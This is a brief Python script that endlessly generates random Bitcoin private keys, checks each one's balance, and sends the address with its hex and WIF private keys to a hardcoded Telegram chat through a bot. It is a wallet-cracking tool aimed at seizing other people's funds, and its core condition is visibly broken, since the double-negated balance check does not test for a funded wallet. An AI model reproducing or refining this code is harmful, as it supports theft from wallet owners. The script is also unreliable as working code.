import secrets, os
import bit
from telegram import Bot
bot = Bot(os.getenv('TG_TOKEN'))

k = 1
while True:
    pk = bit.Key.from_int(secrets.randbits(256))
    # print(pk.address + ' - ' + pk.get_balance('usd') + ' - usd ')

    if not pk.get_balance('usd') != 0 :
        msg="{} - {} USD\nPrivateKey (hex): {}\nPrivateKey (wif): {}".format(pk.address,pk.get_balance('usd'),pk.to_hex(),pk.to_wif())
        bot.send_message(chat_id="-1001589846971", text=msg)
    k += 1